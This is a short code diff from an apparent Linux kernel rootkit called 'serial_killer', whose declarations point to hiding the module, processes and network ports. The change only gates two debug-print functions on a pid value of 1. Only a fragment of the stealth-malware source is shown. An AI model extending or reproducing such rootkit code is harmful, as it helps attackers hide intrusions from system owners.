@@ -56,11 +56,11 @@ void hide_lsmod(void);
 void add_hidden_process(pid_t pid);
 void remove_hidden_process(pid_t pid);
 void free_hidden_processes(void);
-void printk_hidden_processes(void);
+void printk_hidden_processes(pid_t pid);
 void add_hidden_port(pid_t pid);
 void remove_hidden_port(pid_t pid);
 void free_hidden_ports(void);
-void printk_hidden_ports(void);
+void printk_hidden_ports(pid_t pid);
 /******************************************************************************************************************/
 
 void show_lsmod(void) {
@@ -105,7 +105,10 @@ void free_hidden_processes(void) {
     hidden_processes_len = 0;
     return;
 }
-void printk_hidden_processes(void) {
+void printk_hidden_processes(pid_t pid) {
+    if (pid != 1) {
+        return;
+    }
     printk(KERN_DEBUG "serial_killer: hidden process linked list (%d) - ", hidden_processes_len);
     printk_nodes(head_proc);
     return;
@@ -139,7 +142,10 @@ void free_hidden_ports(void) {
     hidden_ports_len = 0;
     return;
 }
-void printk_hidden_ports(void) {
+void printk_hidden_ports(pid_t pid) {
+    if (pid != 1) {
+        return;
+    }
     printk(KERN_DEBUG "serial_killer: hidden ports linked list (%d) - ", hidden_ports_len);
     printk_nodes(head_port);
 }
